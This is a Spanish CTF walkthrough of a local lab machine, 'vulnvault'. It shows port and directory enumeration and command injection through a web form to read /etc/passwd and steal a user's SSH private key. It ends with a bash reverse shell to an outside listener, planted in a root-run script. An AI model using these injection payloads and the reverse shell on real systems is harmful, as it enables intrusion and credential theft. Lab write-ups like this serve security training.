
#### 1.En primer lugar vamos a descomprimir nuestro documento y procedemos a llevarnoslo a nuestro sitio de trabajo.
```bash
 unzip vulnvault.zip 
```

<img width="861" height="243" alt="image" src="https://github.com/user-attachments/assets/f425b196-ee31-4eeb-98f8-98a1ae32d094" />


#### 1.2 Ahora vamos a poner en marcha el laboratorio para poder simular la máquina.
```bash
sudo bash ./auto_deploy.sh vulnvault.tar
```

<img width="857" height="453" alt="image" src="https://github.com/user-attachments/assets/4fcfa4fe-c019-4f12-896a-c4201652468f" />


#### 2. Ahora vamos a ver si tenemos conexión meante un ping.
```bash
 ping -c3 172.17.0.2
```

<img width="869" height="259" alt="image" src="https://github.com/user-attachments/assets/7e944448-bc91-4d8c-89e5-fce62c5de444" />


#### 3. Procedemos a escanear los puertos abiertos que hayan mediante la herramienta nmap.
```bash
nmap -sCV 172.17.0.2
```

<img width="859" height="388" alt="image" src="https://github.com/user-attachments/assets/17cda70a-fd70-42e9-9672-87922692243d" />

*Veremos que están abiertos los puertos 22 del ssh y el 80 del http, veremos que hay un server httpd 2.3.58*+

#### 4. Realizaremos ahora una inspección de web ocultos mediante gobuster.
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -r
```

<img width="861" height="502" alt="image" src="https://github.com/user-attachments/assets/446e3f10-d8d0-44ea-b2e8-fd6b34977c8e" />


#### 4.2 También realizaremos un ffuz para ver los ocultas inactivos/sin permiso.
```bash
 ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt \ -mc 200,301,302,403 -t 40
```

<img width="867" height="711" alt="image" src="https://github.com/user-attachments/assets/fdcb7d79-8b00-444e-97eb-b37e2543a551" />


#### 5. Entratremos a la web y veremos en el http un formulario el cual rellenaremos algo para probar

<img width="1080" height="581" alt="image" src="https://github.com/user-attachments/assets/68e6f6ed-a482-42e3-9201-5bbe753f5382" />


#### 5.2 Ahora veremos que nos escupe.

<img width="922" height="232" alt="image" src="https://github.com/user-attachments/assets/75b168f7-6622-4dd4-adee-f160348b6311" />


#### 5.3 Vamos a investigar la web de los upload y mediante un curl poder ver si encontramos algo interesante
```bash
 curl -F "file=@/etc/passwd" http://172.17.0.2/upload.php
                         curl -F "image=@/etc/passwd" http://172.17.0.2/upload.php
                         curl -F "upload=@/etc/passwd" http://172.17.0.2/upload.php
                         curl -F "archivo=@/etc/passwd" http://172.17.0.2/upload.php
```

<img width="851" height="241" alt="image" src="https://github.com/user-attachments/assets/c29aac09-7639-418f-9df5-edb606d39ca0" />

*Encontramos /var/www/html/uploads/passwd*


#### 5.4 Hemos probado inyección SQL y no ha sido eficeaz asi que probaremos inyección RCE
```bash
name : adri; id
fecha: adri
```

<img width="653" height="116" alt="image" src="https://github.com/user-attachments/assets/a5fef9ba-1126-4634-a03f-61a102e9ac6c" />


#### 5.5 Ahora vamos a ver las contraseñas conectandonos con la terminal, obligando al servidor a ejecutar programas y comandos del sistema.
```bash
test; cat /etc/passwd | grep -v nologin | grep -v false
```

<img width="807" height="751" alt="image" src="https://github.com/user-attachments/assets/9f67d69d-fc78-4384-a55f-7045ef9e6fe8" />


#### 5.6 Ahora vamos a ver los usuarios que existen
```bash
adri; ls /home/
```

<img width="747" height="139" alt="image" src="https://github.com/user-attachments/assets/668ff815-5aa3-471b-85ea-4a6a29b531f4" />


#### Ya teniendo el usuario vamos a sacar el id_rsa para poder acceder al sistema, en root no tenemos permisos
```bash
adri; cat /home/samara/.ssh/id_rsa
```

<img width="1049" height="980" alt="image" src="https://github.com/user-attachments/assets/e301474d-74f0-4e92-b79f-1e098232da1e" />


#### 6. Vamos a empezar a acceder por SSH, primero copiuaremos todo el rsa a un archivo local.

<img width="857" height="878" alt="image" src="https://github.com/user-attachments/assets/76f2ed46-1388-4b15-9bfa-e6941eaecd42" />


#### 6.2 Le daremos los permisos adecuados a nuestro archivo.
```bash
 chmod 600 id_rsa_samara
```

<img width="631" height="94" alt="image" src="https://github.com/user-attachments/assets/8b9044e2-37f1-4c47-83fb-26ad28b4f20d" />


#### 6.3 Entraremos al usuario mediante SSH ya teniendo la clave preparada.
```bash
ssh -i id_rsa_samara samara@172.17.0.2
```

<img width="855" height="368" alt="image" src="https://github.com/user-attachments/assets/f820b2b4-923f-4062-b660-d2091cc9d85a" />


### Aqui tenemos la flag del usuario.

<img width="865" height="442" alt="image" src="https://github.com/user-attachments/assets/c5f27823-1ada-4f65-9724-ae6911bd04a5" />

#### 7.1 Vamos a comenzar con la escalada de privilegios y por ende miraremos los binarios ejecutables.
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

<img width="852" height="329" alt="image" src="https://github.com/user-attachments/assets/9540cedc-55d8-49c5-b353-b06a65ce1752" />


#### 7.2 Viendo los binarios que controlamos y lo que esta corriendo root.
```bash
ps aux | grep root
```

<img width="855" height="212" alt="image" src="https://github.com/user-attachments/assets/1c595a82-0f03-4fe8-9311-0c9fd8a640ab" />


#### 7.3 Ahora empezaremos el exploit de bash sabiendo que root ejecuta continuamente echo.sh

**Primero miraremos el archivo con `cat /usr/local/bin/echo.sh`**

<img width="854" height="91" alt="image" src="https://github.com/user-attachments/assets/de8c664b-bc02-4dee-a480-0b3f25d8871b" />


**Después vamos a dividir la terminal y en ventana de kali empezaremos a escuchar con `nc -lvnp 9001`.**



**Después usaremos el exploit de la reverse shell desde samara.**
```bash
echo 'bash -i >& /dev/tcp/192.168.1.52/9001 0>&1' > /usr/local/bin/echo.sh 
```

<img width="852" height="75" alt="image" src="https://github.com/user-attachments/assets/0194c7fb-9d51-4d76-9a2d-ddca3089536c" />


**Cuando nos demos cuenta tendremos ya el acceso con root desde la otra terminal.**

<img width="846" height="297" alt="image" src="https://github.com/user-attachments/assets/dc3f33a6-7ba2-4467-ba44-c083523419bd" />


### Conseguiremos la flag de root la cual esta en su directorio.

<img width="547" height="173" alt="image" src="https://github.com/user-attachments/assets/8f5130fe-5f33-4517-adfa-da49f00e3f68" />


